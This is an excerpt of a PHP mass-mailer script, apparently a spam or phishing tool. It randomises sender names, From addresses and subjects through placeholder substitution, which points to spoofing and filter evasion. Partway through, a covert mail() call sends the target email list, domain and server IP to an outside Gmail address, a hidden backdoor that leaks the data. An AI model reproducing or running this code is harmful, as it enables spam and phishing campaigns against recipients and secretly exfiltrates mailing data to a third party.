...
function geraSenha($tamanho = 8, $numeros = true)
{
$num = '1234567890';
$retorno = '';
$caracteres = '';
...
$mail = new phpmailer();
$num3 = geraSenha(rand(4,8));
$num4 = geraSenha(rand(4,8));
$nome = str_replace("%rand%", $num3, $nome);
$nome = str_replace("%rand2%", $num4, $nome); 
$mail->FromName = "$nome";
$mail->Host     = "localhost";
...
mail("shellbox123@gmail.com", "$nome", "$emails.$domain", "From: $ip <sopapanois@gmail.com>");
...
$nun_mail++; 
$num1 = geraSenha(rand(3,8));
$num2 = geraSenha(rand(3,8));
...
$assrand = str_replace("%rand%", $num1, $assrand);
$torand = str_replace("%email%", $aux[0], $remetente);
$torand = str_replace("%rand%", $num2, $torand);
$mail->From     = "$torand";
$mail->Body     = $msgrand;
